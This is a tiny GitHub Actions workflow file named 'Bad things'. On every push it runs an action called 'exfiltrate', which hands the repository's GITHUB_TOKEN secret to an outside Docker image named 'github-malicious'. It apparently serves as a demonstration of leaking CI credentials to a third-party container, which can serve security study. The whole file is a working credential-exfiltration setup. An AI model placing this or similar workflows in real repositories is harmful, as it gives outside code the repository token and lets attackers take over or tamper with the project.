workflow "Bad things" {
  on = "push"
  resolves = "Exfiltrate"
}

action "exfiltrate" {
  uses = "docker://nrmitchi/github-malicious:latest"
  secrets = ["GITHUB_TOKEN"]
}

